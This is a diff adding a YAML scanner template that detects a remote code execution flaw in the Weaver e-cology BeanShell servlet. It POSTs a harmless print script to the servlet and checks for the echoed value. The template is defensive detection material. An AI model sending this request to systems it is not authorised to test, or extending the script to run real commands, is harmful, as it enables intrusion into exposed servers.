@@ -1,0 +1,15 @@
+cve-id: ecology-javabeanshell-rce
+set:
+  r1: randomInt(40000, 44800)
+rules:
+  - method: POST
+    path: /weaver/bsh.servlet.BshServlet
+    body: >-
+      bsh.script=print%28{{r1}}%29&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"{{r1}}")
+severity:
+  critical
+type: 
+  rce
